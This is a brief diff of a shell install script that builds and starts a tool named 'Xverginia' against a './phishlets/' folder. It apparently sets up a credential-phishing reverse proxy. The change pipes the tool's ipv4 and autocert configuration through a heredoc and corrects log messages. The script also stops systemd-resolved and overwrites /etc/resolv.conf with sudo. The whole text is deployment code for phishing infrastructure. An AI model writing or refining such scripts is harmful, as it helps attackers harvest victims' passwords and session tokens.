@@ -73,18 +73,20 @@ echo 'export GOPATH=$HOME/go' >> ~/.profile &> /dev/null
 echo 'export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin' >> ~/.profile &> /dev/null
 source ~/.profile &> /dev/null
 unzip 0.0.zip &> /dev/null
-log_info "Building Xverginia..."
+log_info "Building..."
 cd xverginia &> /dev/null
 chmod +x ./build/xverginia &> /dev/null
 sudo service systemd-resolved stop
 echo -e "nameserver 8.8.8.8\nnameserver 1.1.1.1" | sudo tee /etc/resolv.conf &> /dev/null
-./build/xverginia -p ./phishlets/
-bash -c "config ipv4 $uip" &> /dev/null
-bash -c "config autocert off" &> /dev/null
-bash -c "q" &> /dev/null
 
+cat <<EOF > conf.txt
+config ipv4 $uip
+config autocert off
+q
+EOF
+./build/xverginia -p ./phishlets/ < conf.txt
 check_error "Error encountered when building Xverginia"
-log_info "Buid was succesfull"
+log_info "Build was succesfull"
 
 
 
